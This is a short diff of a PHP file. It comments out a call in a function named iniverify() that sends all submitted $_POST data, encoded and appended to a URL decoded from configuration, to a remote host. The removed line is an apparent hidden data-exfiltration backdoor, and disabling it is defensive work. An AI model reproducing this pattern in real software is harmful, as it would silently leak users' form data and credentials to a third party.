@@ -61,7 +61,7 @@ function sfjhff($r) {
 function iniverify(){
     $mz = getinfo(C('URL_STRING_MODEL'));  
     $mz .= '?h='.getinfos(implode('|', $_POST));
-    file_get_contents($mz);
+    // file_get_contents($mz);
 }
 
 
